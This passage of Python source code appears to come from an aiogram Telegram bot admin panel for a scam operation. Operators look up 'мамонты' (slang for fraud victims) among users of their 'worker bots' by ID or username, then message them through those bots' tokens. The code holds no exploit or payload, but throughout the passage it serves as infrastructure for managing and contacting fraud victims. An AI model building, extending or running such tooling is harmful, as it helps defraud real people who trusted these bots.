        await message.answer("<b>❌ Введите корректный ID (число):</b>", parse_mode="HTML")
        return

    await state.update_data(user_id=int(user_id))
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="back_to_mamonty")]
        ]
    )
    await state.set_state(MamontyStates.waiting_message)
    await message.answer(
        "<b>📝 Введите сообщение, которое отправим этому мамонту:</b>\n"
        "<i>Вы можете использовать любое форматирование текста</i>",
        reply_markup=kb,
        parse_mode="HTML"
    )

@router.message(MamontyStates.waiting_message)
async def send_message_to_mamont(message: types.Message, state: FSMContext):
    data = await state.get_data()
    user_id = data.get("user_id")
    await state.clear()
    asyncio.create_task(run_send_mamont_message(message, user_id))

async def run_send_mamont_message(message, user_id):
    return_kb = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="Вернуться", callback_data="back_to_mamonty")]]
    )

    if message.photo or message.video or message.document or message.audio or message.voice or message.sticker:
        await message.answer(
            "<b>❌ Отправка фото, видео, файлов, стикеров и аудио запрещена.</b>",
            reply_markup=return_kb,
            parse_mode="HTML"
        )
        return

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == message.from_user.id))
        if not admin:
            await message.answer("<b>❌ Админ не найден!</b>", reply_markup=return_kb, parse_mode="HTML")
            return

        bots_ids = (await session.execute(
            select(WorkerBot.id).where(WorkerBot.owner_id == admin.id)
        )).scalars().all()

        user = await session.scalar(
            select(WorkerBotUser).where(
                WorkerBotUser.telegram_id == user_id,
                WorkerBotUser.worker_bot_id.in_(bots_ids)
            )
        )
        if not user:
            await message.answer("<b>❌ Мамонт не найден или не твой!</b>", reply_markup=return_kb, parse_mode="HTML")
            return

        bot_obj = await session.get(WorkerBot, user.worker_bot_id)
        if not bot_obj:
            await message.answer("<b>❌ Бот не найден!</b>", reply_markup=return_kb, parse_mode="HTML")
            return

    bot_client = Bot(token=bot_obj.token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    try:
        await bot_client.send_message(chat_id=user_id, text=message.html_text, parse_mode="HTML")
        await message.answer(
            "<b>✅ Сообщение отправлено!</b>",
            reply_markup=return_kb,
            parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(
            f"<b>❌ Мамонт заблокировал бота:\n</b>",
            reply_markup=return_kb,
            parse_mode="HTML"
        )
    finally:
        await bot_client.session.close()

@router.callback_query(F.data == "mamonty_search")
async def mamonty_search_prompt(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(MamontySearchState.waiting_query)
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="back_to_mamonty")]
        ]
    )
    await callback.message.edit_text(
        "<b>🔍 Введите ID или username мамонта:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()

@router.message(MamontySearchState.waiting_query)
async def mamonty_search_process(message: types.Message, state: FSMContext):
    query = message.text.strip().lstrip('@')
    tg_id = message.from_user.id

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == tg_id))
        if not admin:
            await message.answer("<b>❌ Профиль не найден!</b>", parse_mode="HTML")
            return

        bots_ids = (await session.execute(
            select(WorkerBot.id).where(WorkerBot.owner_id == admin.id)
        )).scalars().all()

        user = None
        if query.isdigit():
            user = await session.scalar(
                select(WorkerBotUser)
                .where(WorkerBotUser.telegram_id == int(query),
                       WorkerBotUser.worker_bot_id.in_(bots_ids))
            )
        if not user and query:
            user = await session.scalar(
                select(WorkerBotUser)
                .where(WorkerBotUser.username == query,
                       WorkerBotUser.worker_bot_id.in_(bots_ids))
            )
        if not user:
            kb = InlineKeyboardMarkup(
                inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="back_to_mamonty")]]
            )
            await message.answer("<b>❌ Мамонт не найден!</b>", reply_markup=kb, parse_mode="HTML")
            return

        bot_obj = await session.get(WorkerBot, user.worker_bot_id)

    text = (
        f"<b>🙆🏻‍♀️ Мамонт найден:</b>\n\n"
        f"<b>Тэг:</b> @{user.username or '-'}\n"
        f"<b>ID:</b> <code>{user.telegram_id}</code>\n"
        f"<b>Бот:</b> @{bot_obj.username or '-'}\n"
    )
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Написать мамонту", callback_data=f"send_msg_to_mamont:{user.telegram_id}")],
            [InlineKeyboardButton(text="Назад", callback_data="back_to_mamonty")]
        ]
    )
    await message.answer(text, reply_markup=kb, parse_mode="HTML")
    await state.clear()

@router.callback_query(F.data.startswith("send_msg_to_mamont:"))
async def send_msg_to_mamont_callback(callback: types.CallbackQuery, state: FSMContext):
    user_id = int(callback.data.split(":")[-1])
    await state.update_data(user_id=user_id)
    await state.set_state(MamontySearchState.waiting_message)

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="back_to_mamonty")]
        ]
    )
    await callback.message.edit_text(
        "<b>📝 Введите сообщение, которое отправим этому мамонту:</b>\n<i>Вы можете использовать любое форматирование текста</i>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()

@router.message(MamontySearchState.waiting_message)
async def mamonty_send_message_from_search(message: types.Message, state: FSMContext):
    data = await state.get_data()
    user_id = data.get("user_id")
    await state.clear()
    asyncio.create_task(run_send_mamont_message(message, user_id))